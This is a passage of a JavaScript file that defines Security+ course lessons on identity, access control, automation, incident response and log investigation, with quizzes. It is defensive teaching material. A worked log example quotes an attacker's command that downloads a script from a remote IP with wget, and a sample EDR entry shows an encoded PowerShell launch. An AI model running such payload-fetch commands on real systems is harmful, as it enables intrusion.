          { from: 'L', t: '4. Browser posts assertion to the SaaS app → access granted' }
        ], 'SAML single sign-on flow'),
        compare: { title: 'SAML vs OAuth vs OpenID Connect', head: ['', 'SAML', 'OAuth 2.0', 'OpenID Connect'], rows: [['Purpose', 'Authentication + SSO (federation)', 'Delegated authorization', 'Authentication on top of OAuth'], ['Format', 'XML assertions', 'Access tokens', 'JSON Web Tokens (ID tokens)'], ['Typical use', 'Enterprise SSO to web apps', 'App accessing an API on your behalf', '“Sign in with …” buttons, mobile apps']] },
        check: { q: 'A scheduling app asks users to let it read their cloud calendar without ever seeing their password. Which standard is designed for this?', o: [
          ['LDAP', 'LDAP is for directory queries.'],
          ['OAuth 2.0', 'OAuth grants delegated access via tokens without sharing the password.', true],
          ['RADIUS', 'RADIUS provides AAA for network access.'],
          ['Kerberos', 'Kerberos is ticket-based authentication within a domain.']
        ] }
      },
      {
        h: 'Access control models',
        body: '<ul><li><strong>Mandatory (MAC)</strong>: the system enforces labels (Secret, Top Secret) and clearances; users can’t change them. Used in government and military; SELinux implements it.</li>' +
          '<li><strong>Discretionary (DAC)</strong>: the resource <em>owner</em> decides who gets access (typical file sharing). Flexible, but prone to oversharing.</li>' +
          '<li><strong>Role-based (RBAC)</strong>: permissions are attached to job roles; users get roles. Easy to manage at scale.</li>' +
          '<li><strong>Rule-based</strong>: global rules apply to everyone (firewall rules, “no logins after 8 pm”).</li>' +
          '<li><strong>Attribute-based (ABAC)</strong>: decisions combine attributes of user, resource and environment (department=HR AND device=managed AND location=office). The most granular.</li>' +
          '<li><strong>Time-of-day restrictions</strong> and <strong>least privilege</strong> apply across models.</li></ul>',
        compare: { title: 'Commonly confused: Access control models', head: ['Model', 'Who decides', 'Example'], rows: [['MAC', 'System, via labels/clearances', 'Top Secret clearance required for Top Secret file'], ['DAC', 'Resource owner', 'You share your document with a colleague'], ['RBAC', 'Admin assigns roles', 'Nurses role can view charts'], ['Rule-based', 'Global rules', 'Block all logins 22:00–06:00'], ['ABAC', 'Policy over many attributes', 'Allow if dept=Finance AND managed device AND in-country']] },
        check: { q: 'Access should be granted only when the user is in Finance, using a company-managed laptop, and connecting from inside the country. Which model fits best?', o: [
          ['DAC', 'Owners granting access ad hoc can’t evaluate device and location.'],
          ['RBAC', 'Roles alone don’t account for device and location.'],
          ['ABAC', 'ABAC combines user, device and environmental attributes in one policy.', true],
          ['MAC', 'MAC uses sensitivity labels and clearances.']
        ] }
      },
      {
        h: 'Multifactor authentication',
        body: '<p>MFA requires factors from <strong>different categories</strong>:</p><ul><li><strong>Something you know</strong>: password, PIN.</li><li><strong>Something you have</strong>: hard token, soft token/authenticator app (TOTP), smart card, <strong>security key</strong> (FIDO2).</li>' +
          '<li><strong>Something you are</strong>: biometrics (fingerprint, face).</li><li><strong>Somewhere you are</strong>: location (GPS, IP geolocation).</li></ul>' +
          '<p class="warnbox">A password plus a PIN is <em>not</em> MFA. Both are something you know. Biometric accuracy is described by FAR (false acceptance) and FRR (false rejection); where they cross is the CER (crossover error rate). Lower CER means a better system.</p>',
        check: { q: 'Which combination is true multifactor authentication?', o: [
          ['Password and security question', 'Both are something you know.'],
          ['Fingerprint and face scan', 'Both are something you are.'],
          ['Password and a code from an authenticator app', 'Something you know + something you have = two factors.', true],
          ['Two different passwords', 'Same factor twice.']
        ] }
      },
      {
        h: 'Passwords and passwordless',
        body: '<p>Modern best practice (e.g., NIST guidance): favor <strong>length</strong> (passphrases), check against breached-password lists, avoid forced periodic changes unless there’s evidence of compromise, allow paste for <strong>password managers</strong>, and require MFA. <strong>Passwordless</strong> authentication (FIDO2/passkeys, Windows Hello) uses device-bound keys plus biometrics or a PIN and resists phishing.</p>'
      },
      {
        h: 'Privileged access management (PAM)',
        body: '<ul><li><strong>Just-in-time permissions</strong>: admin rights granted for a task and automatically removed afterward.</li><li><strong>Password vaulting</strong>: privileged credentials are stored in a vault, checked out, rotated and recorded.</li>' +
          '<li><strong>Ephemeral credentials</strong>: short-lived credentials that expire automatically.</li></ul>' +
          '<div class="ex">An admin requests domain admin rights for 2 hours to apply a patch. The PAM system approves, records the session, and revokes the rights when the time expires.</div>'
      }
    ],
    takeaways: [
      'De-provision promptly; review access regularly to stop privilege creep.',
      'SAML = XML federation/SSO; OAuth = delegated authorization; OIDC = authentication on OAuth; LDAP = directory.',
      'MAC (labels), DAC (owner decides), RBAC (roles), rule-based (global rules), ABAC (attributes, most granular).',
      'MFA needs different categories: know / have / are / where.',
      'PAM: just-in-time access, password vaulting, ephemeral credentials, session recording.'
    ]
  });

  SEC.addLesson('4.7', {
    title: 'Automation and Orchestration',
    minutes: 18,
    intro: 'Security teams use <strong>automation</strong> (scripts doing single tasks) and <strong>orchestration</strong> (coordinating many automated tasks across tools, e.g., in a SOAR platform) to work faster and more consistently. Automation also brings risks.',
    terms: [
      ['Automation', 'Using scripts/tools to perform a task without manual work.'],
      ['Orchestration', 'Coordinating multiple automated tasks and systems into a workflow.'],
      ['SOAR', 'Security Orchestration, Automation and Response platform that runs playbooks.'],
      ['Guard rails', 'Automated limits that prevent unsafe configurations (e.g., blocking public storage buckets).'],
      ['CI/CD', 'Continuous Integration / Continuous Delivery. Automated build, test and deploy pipelines.'],
      ['Technical debt', 'Future cost created by quick or poorly maintained solutions.']
    ],
    sections: [
      {
        h: 'Use cases',
        body: '<ul><li><strong>User provisioning</strong> from HR events (join/move/leave).</li><li><strong>Resource provisioning</strong> through IaC with secure defaults.</li>' +
          '<li><strong>Guard rails</strong> and <strong>security groups</strong>: automatically block or fix risky configurations.</li><li><strong>Ticket creation</strong> and <strong>escalation</strong> from alerts.</li>' +
          '<li><strong>Enabling/disabling services and access</strong>: auto-disable an account showing impossible travel.</li><li><strong>Continuous integration and testing</strong>: security scans in every build.</li>' +
          '<li><strong>Integrations and APIs</strong>: connect SIEM, EDR, firewalls and ticketing.</li></ul>',
        diagram: D.flow([{ t: 'SIEM alert', sub: 'phishing reported', tone: 'warn' }, { t: 'SOAR playbook', sub: 'enrich URL, check reputation', tone: 'accent' }, { t: 'Contain', sub: 'block domain, purge emails', tone: 'good' }, { t: 'Ticket', sub: 'analyst reviews' }], 'An orchestrated phishing response playbook'),
        check: { q: 'A SOAR platform receives an EDR alert, isolates the host, blocks the malicious hash on all endpoints and opens a ticket. What is this?', o: [
          ['Orchestration', 'Coordinating multiple automated actions across tools is orchestration.', true],
          ['Manual incident response', 'No human performed these steps.'],
          ['Penetration testing', 'This is response, not testing.'],
          ['Configuration drift', 'Drift is unintended config change.']
        ] }
      },
      {
        h: 'Benefits',
        body: '<p>Efficiency/time saving, <strong>enforcing baselines</strong>, <strong>standard infrastructure configurations</strong>, <strong>scaling in a secure manner</strong>, <strong>employee retention</strong> (fewer tedious tasks, less burnout), faster <strong>reaction time</strong>, and a <strong>workforce multiplier</strong> effect.</p>'
      },
      {
        h: 'Other considerations',
        body: '<ul><li><strong>Complexity</strong>: workflows can become hard to understand and troubleshoot.</li><li><strong>Cost</strong>: platforms, development and maintenance.</li>' +
          '<li><strong>Single point of failure</strong>: if the automation platform breaks, many processes stop.</li><li><strong>Technical debt</strong>: unmaintained scripts break as systems change.</li>' +
          '<li><strong>Ongoing supportability</strong>: someone must own and update the automations.</li></ul>' +
          '<div class="ex">An auto-remediation script that disables accounts after 5 failed logins could lock out the entire company during a password-spraying attack. Test automations and add safety limits.</div>',
        check: { q: 'A security engineer who wrote dozens of undocumented automation scripts leaves the company, and nobody can maintain them. Which concern does this illustrate?', o: [
          ['Workforce multiplier', 'That’s a benefit, not a concern.'],
          ['Ongoing supportability / technical debt', 'Undocumented automations no one can maintain create supportability problems and technical debt.', true],
          ['Guard rails', 'Guard rails are preventive automations.'],
          ['Reaction time', 'This is a benefit of automation.']
        ] }
      }
    ],
    takeaways: [
      'Automation does tasks; orchestration (SOAR) coordinates many tasks across tools.',
      'Use cases: provisioning, guard rails, security groups, tickets/escalation, enabling/disabling access, CI testing, API integrations.',
      'Benefits: speed, consistency, enforced baselines, secure scaling, staff retention, workforce multiplier.',
      'Risks: complexity, cost, single point of failure, technical debt, supportability.'
    ]
  });

  SEC.addLesson('4.8', {
    title: 'Incident Response',
    minutes: 35,
    intro: 'When prevention fails, a practiced <strong>incident response (IR)</strong> process limits damage. Know the phases in order, what happens in each, how to test the plan, and the basics of <strong>digital forensics</strong>: legal hold, chain of custody, order of volatility.',
    terms: [
      ['Incident', 'An event that actually or potentially jeopardizes confidentiality, integrity or availability.'],
      ['Containment', 'Limiting the spread and impact of an incident.'],
      ['Eradication', 'Removing the cause (malware, attacker access, vulnerability).'],
      ['Root cause analysis', 'Determining the underlying reason an incident occurred.'],
      ['Threat hunting', 'Proactively searching for threats that evaded detection.'],
      ['Legal hold', 'An order to preserve data relevant to litigation; normal deletion stops.'],
      ['Chain of custody', 'Documented record of everyone who handled evidence, when and why.'],
      ['E-discovery', 'Identifying and producing electronic information for legal proceedings.']
    ],
    sections: [
      {
        h: 'The incident response process',
        body: '',
        diagram: D.flow([{ t: 'Preparation', tone: 'accent' }, { t: 'Detection' }, { t: 'Analysis' }, { t: 'Containment', tone: 'warn' }, { t: 'Eradication', tone: 'warn' }, { t: 'Recovery', tone: 'good' }, { t: 'Lessons learned', tone: 'accent' }], 'Incident response phases (SY0-701 order)', { bw: 104, bh: 56, loop: true, loopLabel: 'lessons learned improve preparation' }),
        compare: { title: 'What happens in each phase', head: ['Phase', 'Key activities'], rows: [
          ['Preparation', 'IR plan, team roles, contact lists, tools, training, playbooks, baselines'],
          ['Detection', 'Alerts from SIEM/EDR/users indicate a possible incident'],
          ['Analysis', 'Confirm it is real, determine scope and severity, prioritize'],
          ['Containment', 'Isolate hosts, disable accounts, block IPs. Stop the spread while preserving evidence'],
          ['Eradication', 'Remove malware, close the vulnerability, reset compromised credentials'],
          ['Recovery', 'Restore from clean backups, return systems to production, monitor closely'],
          ['Lessons learned', 'Post-incident review: what happened, what worked, what to improve']] },
        check: { q: 'Analysts have confirmed ransomware on three workstations. What should they do NEXT?', o: [
          ['Restore the workstations from backup', 'Recovery comes after containment and eradication; restoring now could be reinfected.'],
          ['Isolate the infected workstations from the network', 'Containment stops the spread and is the next step after analysis.', true],
          ['Hold a lessons-learned meeting', 'That is the final phase.'],
          ['Update the IR plan', 'That happens during preparation and after lessons learned.']
        ] }
      },
      {
        h: 'Training and testing the plan',
        body: '<ul><li><strong>Training</strong>: everyone knows their role and how to report incidents.</li><li><strong>Tabletop exercise</strong>: a discussion of a scenario around a table. Low cost, finds gaps in decisions and communication.</li>' +
          '<li><strong>Simulation</strong>: a realistic exercise (e.g., a red team or a simulated malware outbreak) that tests technical response.</li></ul>'
      },
      {
        h: 'Root cause analysis and threat hunting',
        body: '<p><strong>Root cause analysis</strong> finds the underlying cause (e.g., an unpatched VPN appliance) so it can be fixed and not recur. <strong>Threat hunting</strong> is proactive: analysts form hypotheses (“an attacker may be using PowerShell for lateral movement”) and search data for evidence, using threat intelligence.</p>'
      },
      {
        h: 'Digital forensics',
        body: '<ul><li><strong>Legal hold</strong>: preserve relevant data. Suspend deletion and retention policies.</li>' +
          '<li><strong>Chain of custody</strong>: document every transfer of evidence (who, when, why, where stored). A gap can make evidence inadmissible.</li>' +
          '<li><strong>Acquisition</strong>: collect evidence forensically: bit-for-bit images, write blockers, and hashes taken before and after to prove integrity. Collect in <strong>order of volatility</strong>, from most to least volatile.</li>' +
          '<li><strong>Preservation</strong>: store evidence securely and work on copies, never the original.</li><li><strong>Reporting</strong>: a factual record of findings and methods.</li>' +
          '<li><strong>E-discovery</strong>: finding and producing electronic data for lawsuits.</li></ul>',
        diagram: D.flow([{ t: 'CPU registers & cache', tone: 'bad' }, { t: 'RAM, routing/ARP tables, processes', tone: 'bad' }, { t: 'Temp files / swap', tone: 'warn' }, { t: 'Disk', tone: 'warn' }, { t: 'Remote logs', tone: 'good' }, { t: 'Backups / archives', tone: 'good' }], 'Order of volatility: collect the most volatile first', { bw: 110 }),
        check: { q: 'Which evidence should be collected FIRST from a running compromised server?', o: [
          ['Hard drive image', 'Disk is less volatile than memory.'],
          ['Contents of RAM', 'Memory is lost at power-off, so it is collected before disk.', true],
          ['Archived backups', 'Backups are among the least volatile sources.'],
          ['Firewall logs on the SIEM', 'Remote logs are retained and less volatile.']
        ] }
      }
    ],
    compare: [{ title: 'Commonly confused: Containment vs Eradication vs Recovery', head: ['', 'Containment', 'Eradication', 'Recovery'], rows: [['Goal', 'Stop the spread', 'Remove the cause', 'Return to normal'], ['Examples', 'Isolate host, block IP, disable account', 'Remove malware, patch flaw, reset passwords', 'Restore backups, reconnect, monitor']] }],
    takeaways: [
      'Order: preparation → detection → analysis → containment → eradication → recovery → lessons learned.',
      'Contain before eradicating; eradicate before recovering.',
      'Tabletop = discussion; simulation = realistic practice.',
      'Forensics: legal hold, chain of custody, hash-verified acquisition in order of volatility (RAM before disk), work on copies.',
      'Root cause analysis prevents recurrence; threat hunting looks proactively for hidden attackers.'
    ]
  });

  SEC.addLesson('4.9', {
    title: 'Using Data Sources in Investigations',
    minutes: 30,
    intro: 'Investigators combine many data sources to reconstruct what happened. This scenario objective asks which log or data source answers a given question, and how to read common log entries.',
    terms: [
      ['Firewall log', 'Records allowed/blocked connections (source, destination, port, action).'],
      ['Endpoint log', 'Events from hosts/EDR: processes, file changes, logins.'],
      ['Metadata', 'Data about data: email headers, file timestamps/authors, image GPS info.'],
      ['Packet capture (PCAP)', 'Recording of full network packets for deep analysis (e.g., with Wireshark).'],
      ['Dashboard', 'A visual summary of security metrics and alerts, often in a SIEM.']
    ],
    sections: [
      {
        h: 'Log data sources and the questions they answer',
        body: '',
        compare: { title: 'Which source answers which question?', head: ['Source', 'Answers questions like…', 'Example entry'], rows: [
          ['Firewall logs', 'Was the connection allowed or blocked? Which IP/port?', '<code>DENY TCP 203.0.113.9:51522 → 10.0.1.10:3389</code>'],
          ['Application logs', 'What did the app do? Errors, user actions, failed logins', '<code>login failed user=jsmith src=198.51.100.7</code>'],
          ['Endpoint logs (EDR)', 'Which process ran? What did it spawn or modify?', '<code>winword.exe → powershell.exe -enc …</code>'],
          ['OS security logs', 'Logons, privilege use, account changes (Windows 4624/4625/4720)', '<code>4625 An account failed to log on</code>'],
          ['IPS/IDS logs', 'Which attack signature matched, and was it blocked?', '<code>SQL injection attempt blocked sid:2006445</code>'],
          ['Network logs', 'Router/switch/DNS/DHCP events: which IP had which MAC, DNS lookups', '<code>DHCPACK 10.0.2.45 to 3c:52:82:aa:10:9f</code>'],
          ['Metadata', 'Who wrote a file, when, where an email really came from', '<code>Received: from mail.attacker.example</code>']] },
        check: { q: 'An analyst needs to know which process launched an encoded PowerShell command on a laptop. Which data source is best?', o: [
          ['Firewall logs', 'Firewalls see connections, not which local process launched a command.'],
          ['Endpoint/EDR logs', 'EDR records process creation and parent-child relationships.', true],
          ['NetFlow', 'NetFlow shows traffic metadata only.'],
          ['Vulnerability scan report', 'Scans show weaknesses, not process activity.']
        ] }
      },
      {
        h: 'Other data sources',
        body: '<ul><li><strong>Vulnerability scans</strong>: was the exploited system known to be vulnerable?</li><li><strong>Automated reports</strong> and <strong>dashboards</strong>: trends and summaries for quick situational awareness.</li>' +
          '<li><strong>Packet captures</strong>: the most detailed view of network activity. Shows payloads, exact commands and exfiltrated content (if unencrypted).</li></ul>'
      },
      {
        h: 'Reading logs: a worked example',
        body: '<pre>09:14:02 sshd[811]: Failed password for root from 45.33.10.8 port 51022\n09:14:03 sshd[811]: Failed password for root from 45.33.10.8 port 51040\n... (412 more failures)\n09:21:47 sshd[811]: Accepted password for root from 45.33.10.8 port 53310\n09:22:10 sudo: root : COMMAND=/usr/bin/wget http://45.33.10.8/x.sh</pre>' +
          '<p>Reading it: hundreds of failures for one account from one IP, followed by success, means a <strong>successful brute-force attack</strong>. The <code>wget</code> right after the login shows the attacker downloading a payload. Next steps: contain (block the IP, isolate the host), disable root SSH logins, investigate <code>x.sh</code>, and check for persistence.</p>',
        check: { q: 'In the log above, which entry is the strongest indicator that the attack succeeded?', o: [
          ['The first failed password entry', 'Failures alone show an attempt, not success.'],
          ['“Accepted password for root from 45.33.10.8”', 'A successful login from the same attacking IP after many failures shows compromise.', true],
          ['The sshd process ID', 'The PID is just an identifier.'],
          ['The use of port 51022', 'Source ports are random ephemeral ports.']
        ] }
      }
    ],
    takeaways: [
      'Firewall logs → allowed/blocked connections; EDR → processes; OS security logs → logons and account changes; IPS → matched signatures.',
      'Metadata reveals authors, timestamps, true email origins and locations.',
      'Packet captures give the most detail; NetFlow gives patterns with less storage.',
      'Many failures followed by a success from the same source = successful brute force.'
    ]
  });
})();
